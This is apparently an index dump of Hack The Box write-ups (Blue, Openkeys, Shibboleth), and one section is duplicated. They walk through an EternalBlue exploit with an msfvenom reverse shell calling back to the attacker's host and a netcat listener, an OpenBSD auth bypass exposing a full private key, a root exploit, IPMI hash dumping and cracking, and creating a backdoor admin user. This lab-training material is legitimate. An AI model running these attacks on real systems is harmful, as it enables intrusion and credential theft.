 message_signing: disabled (dangerous, but default)\n  | smb2-security-mode:\n  |   2.02:\n  |_    Message signing enabled but not required\n  | smb2-time:\n  |   date: 2021-02-24T13:00:38\n  |_  start_date: 2021-02-24T12:54:58\n\n\n[root:/git/htb/blue]# nmap -p139,445 --script vuln 10.10.10.40                                                                    (master✱)\n  Host script results:\n  |_smb-vuln-ms10-054: false\n  |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND\n  | smb-vuln-ms17-010:\n  |   VULNERABLE:\n  |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n  |     State: VULNERABLE\n  |     IDs:  CVE:CVE-2017-0143\n  |     Risk factor: HIGH\n  |       A critical remote code execution vulnerability exists in Microsoft SMBv1\n  |        servers (ms17-010).\n  |\n  |     Disclosure date: 2017-03-14\n  |     References:\n  |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\n  |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n  |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143\n\n\n\nJust like the box legacy this device is vulnerable to ms17-010, EternalBlue (as suggested by the box name). Trying to execute the same exploit and payload however gives us an error, so we need to find another approach.\n[root:/git/htb/blue]# python send_and_execute.py 10.10.10.40 ms17-010.exe                                                         (master✱)\n  Trying to connect to 10.10.10.40:445\n  Target OS: Windows 7 Professional 7601 Service Pack 1\n  Not found accessible named pipe\n  Done\nAssemble the shellcode to binary, here we need to know the architecture (x64 or x86) but Im assuming it’s x64 so lets start with that.\n[root:/git/htb/blue]# nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin\nGenerate binary payload:\n[root:/git/htb/blue]# msfvenom -p windows/x64/shell_reverse_tcp LPORT=4488 LHOST=10.10.14.10 --platform windows -a x64 --format raw -o sc_x64_payload.bin\n  No encoder specified, outputting raw payload\n  Payload size: 460 bytes\n  Saved as: sc_x64_payload.bin\nConcentrate payload & shellcode:\n[root:/git/htb/blue]# cat sc_x64_kernel.bin sc_x64_payload.bin &gt; sc_x64.bin\nExploit and grab all the flags.\n[root:/git/htb/blue]# python eternalblue_exploit7.py 10.10.10.40 sc_x64.bin                                                       (master✱)\n  shellcode size: 1232\n  numGroomConn: 13\n  Target OS: Windows 7 Professional 7601 Service Pack 1\n  SMB1 session setup allocate nonpaged pool success\n  SMB1 session setup allocate nonpaged pool success\n  good response status: INVALID_PARAMETER\n  done\n\n\n[root:/git/htb/blue]# nc -lvnp 4488                                                                                               (master✱)\n  listening on [any] 4488 ...\n  connect to [10.10.14.10] from (UNKNOWN) [10.10.10.40] 49158\n  Microsoft Windows [Version 6.1.7601]\n  Copyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\n  C:\\Windows\\system32&gt;whoami\n    nt authority\\system\n\n  C:\\Users\\haris\\Desktop&gt;type user.txt\n    4c546aea7dbee75cbd71de245c8deea9\n\n  C:\\Users\\Administrator\\Desktop&gt;type root.txt\n    ff548eb71e920ff6c08843ce9df4e717"
  },
  {
    "objectID": "posts/2019-04-09-htb-writeup-blue/2019-04-09-htb-writeup-blue.html#enumeration",
    "href": "posts/2019-04-09-htb-writeup-blue/2019-04-09-htb-writeup-blue.html#enumeration",
    "title": "Blue - Hack The Box",
    "section": "",
    "text": "[root:/git/htb/blue]# nmap -Pn -n -sCV 10.10.10.40 --open                                                                         (master✱)\n  Not shown: 991 closed ports\n  PORT      STATE SERVICE      VERSION\n  135/tcp   open  msrpc        Microsoft Windows RPC\n  139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n  445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)\n  49152/tcp open  msrpc        Microsoft Windows RPC\n  49153/tcp open  msrpc        Microsoft Windows RPC\n  49154/tcp open  msrpc        Microsoft Windows RPC\n  49155/tcp open  msrpc        Microsoft Windows RPC\n  49156/tcp open  msrpc        Microsoft Windows RPC\n  49157/tcp open  msrpc        Microsoft Windows RPC\n  Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\n  Host script results:\n  |_clock-skew: mean: 3m40s, deviation: 1s, median: 3m39s\n  | smb-os-discovery:\n  |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)\n  |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional\n  |   Computer name: haris-PC\n  |   NetBIOS computer name: HARIS-PC\\x00\n  |   Workgroup: WORKGROUP\\x00\n  |_  System time: 2021-02-24T13:00:40+00:00\n  | smb-security-mode:\n  |   account_used: guest\n  |   authentication_level: user\n  |   challenge_response: supported\n  |_  message_signing: disabled (dangerous, but default)\n  | smb2-security-mode:\n  |   2.02:\n  |_    Message signing enabled but not required\n  | smb2-time:\n  |   date: 2021-02-24T13:00:38\n  |_  start_date: 2021-02-24T12:54:58\n\n\n[root:/git/htb/blue]# nmap -p139,445 --script vuln 10.10.10.40                                                                    (master✱)\n  Host script results:\n  |_smb-vuln-ms10-054: false\n  |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND\n  | smb-vuln-ms17-010:\n  |   VULNERABLE:\n  |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n  |     State: VULNERABLE\n  |     IDs:  CVE:CVE-2017-0143\n  |     Risk factor: HIGH\n  |       A critical remote code execution vulnerability exists in Microsoft SMBv1\n  |        servers (ms17-010).\n  |\n  |     Disclosure date: 2017-03-14\n  |     References:\n  |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\n  |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n  |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143"
  },
  {
    "objectID": "posts/2019-04-09-htb-writeup-blue/2019-04-09-htb-writeup-blue.html#exploit-ms17-010",
    "href": "posts/2019-04-09-htb-writeup-blue/2019-04-09-htb-writeup-blue.html#exploit-ms17-010",
    "title": "Blue - Hack The Box",
    "section": "",
    "text": "Just like the box legacy this device is vulnerable to ms17-010, EternalBlue (as suggested by the box name). Trying to execute the same exploit and payload however gives us an error, so we need to find another approach.\n[root:/git/htb/blue]# python send_and_execute.py 10.10.10.40 ms17-010.exe                                                         (master✱)\n  Trying to connect to 10.10.10.40:445\n  Target OS: Windows 7 Professional 7601 Service Pack 1\n  Not found accessible named pipe\n  Done\nAssemble the shellcode to binary, here we need to know the architecture (x64 or x86) but Im assuming it’s x64 so lets start with that.\n[root:/git/htb/blue]# nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin\nGenerate binary payload:\n[root:/git/htb/blue]# msfvenom -p windows/x64/shell_reverse_tcp LPORT=4488 LHOST=10.10.14.10 --platform windows -a x64 --format raw -o sc_x64_payload.bin\n  No encoder specified, outputting raw payload\n  Payload size: 460 bytes\n  Saved as: sc_x64_payload.bin\nConcentrate payload & shellcode:\n[root:/git/htb/blue]# cat sc_x64_kernel.bin sc_x64_payload.bin &gt; sc_x64.bin\nExploit and grab all the flags.\n[root:/git/htb/blue]# python eternalblue_exploit7.py 10.10.10.40 sc_x64.bin                                                       (master✱)\n  shellcode size: 1232\n  numGroomConn: 13\n  Target OS: Windows 7 Professional 7601 Service Pack 1\n  SMB1 session setup allocate nonpaged pool success\n  SMB1 session setup allocate nonpaged pool success\n  good response status: INVALID_PARAMETER\n  done\n\n\n[root:/git/htb/blue]# nc -lvnp 4488                                                                                               (master✱)\n  listening on [any] 4488 ...\n  connect to [10.10.14.10] from (UNKNOWN) [10.10.10.40] 49158\n  Microsoft Windows [Version 6.1.7601]\n  Copyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\n  C:\\Windows\\system32&gt;whoami\n    nt authority\\system\n\n  C:\\Users\\haris\\Desktop&gt;type user.txt\n    4c546aea7dbee75cbd71de245c8deea9\n\n  C:\\Users\\Administrator\\Desktop&gt;type root.txt\n    ff548eb71e920ff6c08843ce9df4e717"
  },
  {
    "objectID": "posts/2020-09-10-htb-writeup-openkeys/2020-09-10-htb-writeup-openkeys.html",
    "href": "posts/2020-09-10-htb-writeup-openkeys/2020-09-10-htb-writeup-openkeys.html",
    "title": "Openkeys - Hack The Box",
    "section": "",
    "text": "██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nroot@nidus:/git/htb/openkeys# nmap -Pn -n -sC -sV 10.10.10.199 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.1 (protocol 2.0) | ssh-hostkey: | 3072 5e:ff:81:e9:1f:9b:f8:9a:25:df:5d:82:1a:dd:7a:81 (RSA) | 256 64:7a:5a:52:85:c5:6d:d5:4a:6b:a7:1a:9a:8a:b9:bb (ECDSA) |_ 256 12:35:4b:6e:23:09:dc:ea:00:8c:72:20:c7:50:32:f3 (ED25519) 80/tcp open http OpenBSD httpd |_http-title: Site doesn’t have a title (text/html).\nDIRB: ==&gt; DIRECTORY: http://10.10.10.199/css/ ==&gt; DIRECTORY: http://10.10.10.199/fonts/ ==&gt; DIRECTORY: http://10.10.10.199/images/ ==&gt; DIRECTORY: http://10.10.10.199/includes/\n\nhttp://10.10.10.199/index.html (CODE:200|SIZE:96)\nhttp://10.10.10.199/index.php (CODE:200|SIZE:4837) ==&gt; DIRECTORY: http://10.10.10.199/js/ ==&gt; DIRECTORY: http://10.10.10.199/vendor/\n\nNIKTO:\n\nServer: OpenBSD httpd\nCookie PHPSESSID created without the httponly flag\nMultiple index files found: /index.php, /index.html\nOSVDB-3092: /includes/: This might be interesting…\n\nEnumerating the webserver we find some interesting files right away.\n\nhttp://10.10.10.199/includes/auth.php.swp\nDownload the swap-file and restor it by using ‘vim -r auth.php.swp’, save the file as auth.php (:w auth.php)\nroot@nidus:/git/htb/openkeys# curl http://10.10.10.199/includes/auth.php.swp --output auth.php.swp\nroot@nidus:/git/htb/openkeys# cat auth.php\n  [..]\n  $cmd = escapeshellcmd(\"../auth_helpers/check_auth \" . $username . \" \" . $password);\n  system($cmd, $retcode);\n  [..]\n  function init_session()\n  {\n      $_SESSION[\"logged_in\"] = True;\n      $_SESSION[\"login_time\"] = $_SERVER['REQUEST_TIME'];\n      $_SESSION[\"last_activity\"] = $_SERVER['REQUEST_TIME'];\n      $_SESSION[\"remote_addr\"] = $_SERVER['REMOTE_ADDR'];\n      $_SESSION[\"user_agent\"] = $_SERVER['HTTP_USER_AGENT'];\n      $_SESSION[\"username\"] = $_REQUEST['username'];\nFrom the first snippet of the code we see that username and passwords are verified using ‘../auth_helpers/check_auth’ In the second snippet we learn that the SESSION variable is controlled in the init-function, including username on the last line.\nLastly, running strings on the swap file gives us a user - Jennifer.\nroot@nidus:/git/htb/openkeys# strings auth.php.swp\n  b0VIM 8.1\n  jennifer\n  openkeys.htb\n  [..]\nDownload the check_auth program, and enumerate it. root@nidus:/git/htb/openkeys# curl http://10.10.10.199/auth_helpers/check_auth –output check_auth root@nidus:/git/htb/openkeys# file check_auth check_auth: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /usr/libexec/ld.so, for OpenBSD, not stripped\nWe could try to RE this ELF-file, however I’ll go with this as a last resort. As for now it is not needed.\n\nWith all enumerated information, lets start to look for exploits. Pretty quickly we find an article covering four big OpenBSD vulnerabilities:\n\nCVE-2019-19519 (Local privilege escalation)\nCVE-2019-19520 (Local privilege escalation)\nCVE-2019-19521 (Authentication Bypass)\nCVE-2019-19522 (Local privilege escalation)\n\n\nCVE-2019-19521 tells us in short that we can bypass the auth by entering ‘-schallenge’ as username, and any password. Trying this on our login prompt is successful, we are greeted with the text “OpenSSH key not found for user -schallenge”\nThis is where I got stuck for a good while and had to turn to the forums for help. But as we could see before, the SESSION variable username can be controlled - and maybe tampered with in the cookie. Set the Name-filed to ‘username’ and Value-filed to ‘jennifer’.\nLog in and out again, and voila! We got Jennifer’s private key!\n -----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\n\nSave the private key, login as Jennifer and grab user.txt.\nroot@nidus:/git/htb/openkeys# ssh jennifer@openkeys.htb -i jennifer_id-rsa Last login: Wed Jun 24 09:31:16 2020 from 10.10.14.2 OpenBSD 6.6 (GENERIC) #353: Sat Oct 12 10:45:56 MDT 2019\nWelcome to OpenBSD: The proactively secure Unix-like operating system.\nPlease use the sendbug(1) utility to report bugs in the system. Before reporting a bug, please try to reproduce it with the latest version of the code. With bug reports, please try to ensure that enough information to reproduce the problem is enclosed, and if a known fix for it exists, include that as well.\nopenkeys$ id uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel) openkeys$ cat user.txt 36ab21239a15c537bde90626891d2b10\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nFrom our previous article, we also found three CVE’s for Local PrivEsc, CVE-2019-19519, CVE-2019-19520 and CVE-2019-19522. A quick google for the CVE’s we find a script called openbsd-authroot on github, download it and try it out.\nopenkeys$ vi openbsd-authroot openkeys$ chmod +x openbsd-authroot openkeys$ ./openbsd-authroot openbsd-authroot (CVE-2019-19520 / CVE-2019-19522) [*] checking system … [*] system supports S/Key authentication [*] id: uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel) [*] compiling … [*] running Xvfb … [*] testing for CVE-2019-19520 … _XSERVTransmkdir: ERROR: euid != 0,directory /tmp/.X11-unix will not be created. [+] success! we have auth group permissions\nWARNING: THIS EXPLOIT WILL DELETE KEYS. YOU HAVE 5 SECONDS TO CANCEL (CTRL+C).\n[*] trying CVE-2019-19522 (S/Key) … Your password is: EGG LARD GROW HOG DRAG LAIN otp-md5 99 obsd91335 S/Key Password:\nopenkeys# id uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest) openkeys# cat root.txt f3a553b1697050ae885e7c02dbfc6efa\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nOpenBSD Auth Bypass https://www.secpod.com/blog/openbsd-authentication-bypass-and-local-privilege-escalation-vulnerabilities/ https://www.qualys.com/2019/12/04/cve-2019-19521/authentication-vulnerabilities-openbsd.txt\nopenbsd-authroot PrivEsc https://github.com/bcoles/local-exploits/blob/master/CVE-2019-19520/openbsd-authroot"
  },
  {
    "objectID": "posts/2021-11-23-htb-writeup-shibboleth/2021-11-23-htb-writeup-shibboleth.html",
    "href": "posts/2021-11-23-htb-writeup-shibboleth/2021-11-23-htb-writeup-shibboleth.html",
    "title": "Shibboleth - Hack The Box",
    "section": "",
    "text": "USER\n\nStep 1\nnmap:\n┌──(void㉿void)-[/htb/shibboleth]\n└─$ nmap -Pn -n -sCV 10.10.11.124  \nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.41\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Did not follow redirect to http://shibboleth.htb/\nService Info: Host: shibboleth.htb\n\n┌──(void㉿void)-[/htb/shibboleth]\n└─$ sudo nmap -sU shibboleth.htb                                                   \nPORT    STATE SERVICE\n623/udp open  asf-rmcp\ndirb:\n==&gt; DIRECTORY: http://shibboleth.htb/assets/\n==&gt; DIRECTORY: http://shibboleth.htb/forms/\n+ http://shibboleth.htb/index.html (CODE:200|SIZE:59474)\n+ http://shibboleth.htb/server-status (CODE:403|SIZE:279)\nnikto:\n+ Server: Apache/2.4.41 (Ubuntu)\n+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD\nffuf:\n┌──(void㉿void)-[/htb/shibboleth]\n└─$ ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://shibboleth.htb -H \"Host: FUZZ.shibboleth.htb\" -fl 10\n[... snip ...]\nmonitoring              [Status: 200, Size: 3686, Words: 192, Lines: 30]\nmonitor                 [Status: 200, Size: 3686, Words: 192, Lines: 30]\n\n4 employees on shibboleth.htb\n\n./namemash.py /htb/shibboleth/users.txt &gt; /htb/shibboleth/user-mash.txt\n\nZabbix v5.x on monitor.shibboleth.htb\nIPMI-2.0 on UDP 623\n\nReading about IPMI-2.0 there is a serious vulnerability via “Cipher 0”, leading to a authentication bypass. To identify if the target is vulnerable we can use:\nmsf6 &gt; use auxiliary/scanner/ipmi/ipmi_version\nmsf6 auxiliary(scanner/ipmi/ipmi_version) &gt; set rhosts 10.10.11.124\nmsf6 auxiliary(scanner/ipmi/ipmi_version) &gt; run\n[*] Sending IPMI requests to 10.10.11.124-&gt;10.10.11.124 (1 hosts)\n[+] 10.10.11.124:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0)\n\nmsf6 auxiliary(scanner/ipmi/ipmi_version) &gt; use auxiliary/scanner/ipmi/ipmi_cipher_zero\nmsf6 auxiliary(scanner/ipmi/ipmi_cipher_zero) &gt; set rhosts 10.10.11.124\nmsf6 auxiliary(scanner/ipmi/ipmi_cipher_zero) &gt; run\n[*] Sending IPMI requests to 10.10.11.124-&gt;10.10.11.124 (1 hosts)\n[+] 10.10.11.124:623 - IPMI - VULNERABLE: Accepted a session open request for cipher zero\nWe can abuse this issue with ipmitool, however it requires a valid user so loop through different user lists to get a hit.\n┌──(void㉿void)-[/htb/shibboleth]\n└─$ for i in $(cat /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt); do ipmitool -I lanplus -C 0 -H 10.10.11.124 -U $i -P randomjunkpass user list; done\nError: Unable to establish IPMI v2 / RMCP+ session\nError: Unable to establish IPMI v2 / RMCP+ session\nError: Unable to establish IPMI v2 / RMCP+ session\nID  Name         Callin  Link Auth  IPMI Msg   Channel Priv Limit\n1                    true    false      false      USER\n2   Administrator    true    false      true       USER\n3                    true    false      false      Unknown (0x00)\n4                    true    false      false      Unknown (0x00)\n5                    true    false      false      Unknown (0x00)\n6                    true    false      false      Unknown (0x00)\n7                    true    false      false      Unknown (0x00)\n8                    true    false      false      Unknown (0x00)\n9                    true    false      false      Unknown (0x00)\n10                   true    false      false      Unknown (0x00)\n11                   true    false      false      Unknown (0x00)\n12                   true    false      false      Unknown (0x00)\n13                   true    false      false      Unknown (0x00)\n14                   true    false      false      Unknown (0x00)\n15                   true    false      false      Unknown (0x00)\n16                   true    false      false      Unknown (0x00)\n17                   true    false      false      Unknown (0x00)\n18                   true    false      false      Unknown (0x00)\n19                   true    false      false      Unknown (0x00)\n20                   true    false      false      Unknown (0x00)\n21                   true    false      false      Unknown (0x00)\n22                   true    false      false      Unknown (0x00)\n23                   true    false      false      Unknown (0x00)\n24                   true    false      false      Unknown (0x00)\n25                   true    false      false      Unknown (0x00)\n26                   true    false      false      Unknown (0x00)\n27                   true    false      false      Unknown (0x00)\n28                   true    false      false      Unknown (0x00)\n29                   true    false      false      Unknown (0x00)\n30                   true    false      false      Unknown (0x00)\n31                   true    false      false      Unknown (0x00)\n32                   true    false      false      Unknown (0x00)\n33                   true    false      false      Unknown (0x00)\n34                   true    false      false      Unknown (0x00)\n35                   true    false      false      Unknown (0x00)\n36                   true    false      false      Unknown (0x00)\n37                   true    false      false      Unknown (0x00)\n38                   true    false      false      Unknown (0x00)\n39                   true    false      false      Unknown (0x00)\n40                   true    false      false      Unknown (0x00)\n41                   true    false      false      Unknown (0x00)\n42                   true    false      false      Unknown (0x00)\n43                   true    false      false      Unknown (0x00)\n44                   true    false      false      Unknown (0x00)\n45                   true    false      false      Unknown (0x00)\n46                   true    false      false      Unknown (0x00)\n47                   true    false      false      Unknown (0x00)\n48                   true    false      false      Unknown (0x00)\n49                   true    false      false      Unknown (0x00)\n50                   true    false      false      Unknown (0x00)\n51                   true    false      false      Unknown (0x00)\n52                   true    false      false      Unknown (0x00)\n53                   true    false      false      Unknown (0x00)\n54                   true    false      false      Unknown (0x00)\n55                   true    false      false      Unknown (0x00)\n56                   true    false      false      Unknown (0x00)\n57                   true    false      false      Unknown (0x00)\n58                   true    false      false      Unknown (0x00)\n59                   true    false      false      Unknown (0x00)\n60                   true    false      false      Unknown (0x00)\n61                   true    false      false      Unknown (0x00)\n62                   true    false      false      Unknown (0x00)\n63                   true    false      false      Unknown (0x00)\nError: Unable to establish IPMI v2 / RMCP+ session\nError: Unable to establish IPMI v2 / RMCP+ session\nError: Unable to establish IPMI v2 / RMCP+ session\n\n\n\nStep 2\nWith a known IPMI user we can extract it’s password hash using scanner/ipmi/ipmi_dumphashes, change the Administrator password using ipmitool, or even create a new user. Because of OPSEC reasons we chose to go with the first.\nmsf6 &gt; use auxiliary/scanner/ipmi/ipmi_dumphashes\nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; set rhosts 10.10.11.124\nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; run\n\n[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:25c57b7b8405000008904066caa92e976c68e804989073044e82977617542af3e0def24a61f3bb61a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:9bcd1814a60990cec7b9579c2236c1a55465af4a\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nCrack the hash with hashcat:\nPS C:\\tools\\hashcat-6.2.4&gt; .\\hashcat.exe -a0 -m7300 .\\administrator-ipmi.txt .\\rockyou.txt\n[... snip ...]\n\n25c57b7b8405000008904066caa92e976c68e804989073044e82977617542af3e0def24a61f3bb61a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:9bcd1814a60990cec7b9579c2236c1a55465af4a:ilovepumkinpie1\n\nSession..........: hashcat\nStatus...........: Cracked\nCredentials found! Administrator:ilovepumkinpie1\nThe credentials work in Zabbix, giving us an Initial Foothold.\nBONUS: Create ADMINISTRATOR User (not relevant for this box)\n$ ipmitool -I lanplus -C 0 -H 10.10.11.124 -U Administrator -P randomjunkpass user set name 3 p3           \n$ ipmitool -I lanplus -C 0 -H 10.10.11.124 -U Administrator -P randomjunkpass user set password 3 p3       \nSet User Password command successful (user 3)\n\n$ ipmitool -I lanplus -C 0 -H 10.10.11.124 -U Administrator -P randomjunkpass user set priv 3 4     \nUser Commands:\n               summary      [&lt;channel number&gt;]\n               list         [&lt;channel number&gt;]\n               set name     &lt;user id&gt; &lt;username&gt;\n               set password &lt;user id&gt; [&lt;password&gt; &lt;16|20&gt;]\n               disable      &lt;user id&gt;\n               enable       &lt;user id&gt;\n               priv         &lt;user id&gt; &lt;privilege level&gt; [&lt;channel number&gt;]\n                     Privilege levels:\n                      * 0x1 - Callback\n                      * 0x2 - User\n                      * 0x3 - Operator\n                      * 0x4 - Administrator\n                      * 0x5 - OEM Proprietary\n                      * 0xF - No Access\n\n               test         &lt;user id&gt; &lt;16|20&gt; [&lt;password]&gt;\n\n$ ipmitool -I lanplus -C 0 -H 10.10.11.124 -U Administrator -P randomjunkpass user priv 3 4                                                            1 ⨯\nSet Privilege Level command successful (user 3)\n$ ipmitool -I lanplus -C 0 -H 10.10.11.124 -U Administrator -P randomjunkpass user list    \nID  Name         Callin  Link Auth  IPMI Msg   Channel Priv Limit\n1                    true    false      false      USER\n2   Administrator    true    false      true       USER\n3   p3               true    false      false      ADMINISTRATOR\n\n\n\nStep 3\nAfter a LOT of time going through Zabbix I found this post explaining how to execute commands from the server through items.\nFirst, go to Configuration &gt; Hosts &gt; Items\n![[Pasted image 